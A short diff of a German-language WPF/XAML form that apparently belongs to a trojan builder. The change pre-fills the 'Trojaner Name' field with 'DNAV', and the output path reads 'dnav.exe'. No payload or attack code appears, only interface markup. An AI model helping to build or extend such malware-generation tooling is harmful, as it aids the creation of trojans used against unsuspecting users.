@@ -281,7 +281,7 @@
                     <RowDefinition Height="1*"/>
                 </Grid.RowDefinitions>
                 <TextBlock Grid.Column="1" VerticalAlignment="Bottom">Trojaner Name</TextBlock>
-                <TextBox Grid.Row="1" Grid.Column="1" Grid.ColumnSpan="2" x:Name="nameTextBox" FontSize="18" VerticalContentAlignment="Center"></TextBox>
+                <TextBox Grid.Row="1" Grid.Column="1" Grid.ColumnSpan="2" x:Name="nameTextBox" FontSize="18" VerticalContentAlignment="Center">DNAV</TextBox>
                 <TextBlock Grid.Column="1" Grid.Row="2" VerticalAlignment="Bottom">Ausgabepfad</TextBlock>
                 <TextBlock x:Name="pathTextBlock" Grid.Row="3" Grid.Column="1" Grid.ColumnSpan="4" VerticalAlignment="Center" FontSize="12" TextWrapping="Wrap">dnav.exe</TextBlock>
                 <Border PreviewMouseLeftButtonDown="ChangePath_Click" Grid.Row="3" Grid.Column="5" BorderThickness="0" CornerRadius="7">
